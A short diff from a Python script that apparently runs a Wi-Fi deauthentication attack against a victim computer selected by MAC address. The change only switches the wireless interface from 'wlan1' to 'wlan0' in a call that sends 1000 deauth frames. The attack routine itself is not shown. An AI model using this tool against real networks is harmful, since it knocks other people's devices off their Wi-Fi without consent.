@@ -14,7 +14,7 @@ if __name__ == "__main__":
     parser = AP(description="Perform Deauthentication attack against a computer")
     parser.add_argument("-t", "--target-mac",metavar="MAC",help="the MAC address of the victim's computer (Airodump-ng Station)")
     args = parser.parse_args()
-    deauth("wlan1", 1000, args.target_mac, args.target_mac)
+    deauth("wlan0", 1000, args.target_mac, args.target_mac)
 
     myfile = "../.files/pid.txt"
     with open(myfile, "w") as f:
